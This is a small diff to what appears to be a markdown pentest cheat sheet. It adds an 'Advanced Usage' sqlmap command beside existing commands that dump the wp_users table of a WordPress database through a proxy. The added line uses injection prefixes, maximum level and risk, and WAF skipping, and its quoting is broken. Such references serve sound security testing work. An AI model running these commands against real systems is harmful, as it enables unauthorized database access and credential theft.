@@ -23,6 +23,9 @@ sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081
 #Dump Tables
 sqlmap.py -I rawrequest2.raw --tables
 sqlmap.py -l rawrequest2.raw --dump -D wordpress -T wp_users
+
+#Advanced Usage
+sqlmap -l /tmp/burp.log --scope="site.org" --dbms=mssql --os=windows --prefix="')" --suffix=" AND ('a'='a" --string="found --technique=BT --regex="User.+found" --level=5 --risk=3 --skip-waf --proxy=PROXY 
 {% endhighlight %}
 
 > **Riding Sessions**
